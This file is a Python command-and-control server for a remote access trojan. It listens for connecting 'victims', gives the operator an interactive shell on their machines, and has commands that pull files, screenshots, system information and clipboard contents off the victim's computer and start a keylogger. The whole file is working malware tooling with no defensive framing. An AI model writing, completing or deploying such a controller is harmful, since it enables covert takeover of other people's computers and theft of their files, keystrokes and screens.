#!/usr/bin/python3
import socket
import json
import base64
import datetime
import struct
import sys


HostIP="192.168.XX.XXX"
HostPort=5XXXX

HEADER_FORMAT = ">I"

def reliable_send(data):
	if isinstance(data, dict) or isinstance(data,list):
		json_str = json.dumps(data)
	else:
		json_str = str(data)
	
	json_bytes = json_str.encode("utf-8")
	length = len(json_bytes)

	header = struct.pack(HEADER_FORMAT, length)

	try:
		target.sendall(header + json_bytes)
		return True
	except socket.error as e:
		print("[!!] Send Error:")
		return False

def reliable_recv():
	try:
		header_bytes = b""
		while len(header_bytes) < 4:
			chunk = target.recv(4 - len(header_bytes))
			if not chunk:
				return None
			header_bytes += chunk

		length = struct.unpack(HEADER_FORMAT, header_bytes)[0]
		
		json_bytes = b""
		while len(json_bytes) < length:
			chunk = target.recv(length - len(json_bytes))
			if not chunk:
				return None
			json_bytes += chunk

		try:
			data = json.loads(json_bytes.decode("utf-8"))
			return data
		except (ValueError, json.JSONDecodeError):
			return json_bytes.decode("utf-8")

	except Exception as e:
		print("[!!] Receive Error: ")
		return None

def print_json(data):
	if isinstance(data, str):
		try:
			parsed = json.loads(data)
			print(json.dumps(parsed, indent=4, ensure_ascii=False))
		except:
			print(data)
	else:
		print(json.dumps(data, indent=4, ensure_ascii=False))

#Establish Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

#Bind Address
s.bind((HostIP, HostPort))
s.listen()

print("[*] Server ready, listening on {}:{}".format(HostIP,HostPort))

server_running = True

# Communicate
while server_running:
	try:
		print("Server Start!")
		target, ip = s.accept()
		print("Victim connected!", ip)
	except (socket.error, keyboardInterrupt):
		break

	try:
		while True:
			command = input(f"* Shell#~{ip} : ")
			if not command:
				continue

			if not reliable_send(command):
				break
			if command == "q":
				server_running = False
				break
			elif command[:2] == "cd" and len(command) > 1:
				continue
			elif command[:8] == "download":		#Client to Server
				result = reliable_recv()
				if result[:4]  != "[!!]":
					with open(command[9:], "wb") as file_down:
						file_down.write(base64.b64decode(result))
				else:
					print(result)
			elif command[:6] == "upload":
				try:
					with open(command[7:], "rb") as file_up:
						content = file_up.read()
						reliable_send(base64.b64encode(content).decode("ascii"))
				except:
					failed = "[!!] Fail to upload!"
					reliable_send(failed)
					print(failed)
			elif command[:10] == "screenshot":
				image = reliable_recv()
				if image[:4] != "[!!]":
					ss_file = "screen_" + str(ip) + datetime.datetime.now().strftime("_%Y-%m-%d_%H:%M:%S")
					with open(ss_file, "wb") as screen:
						screen.write(base64.b64decode(image))
				else:
					print(image)
			elif command[:12] == "keylog_start":
				continue
			elif command[:8] == "systeminfo":
				result = reliable_recv()
				print_json(result)
			elif command[:9] == "clipboard":
				result = reliable_recv()
				print_json(result)
			else:
				#result = target.recv(1024)
				result = reliable_recv()
				if result is None:
					print("[!!]Error!")
					break
				print(result)
	except Exception as e:
		print(f"[!!] Server error: {e}")

	finally:
		try:
			target.close()
		except:
			pass
		if not server_running:
			try:
				s.close()
			except:
				pass
			break
		else:
			print("[*] Client disconnected, waiting for new connection.....")

#Disconnect
s.close()
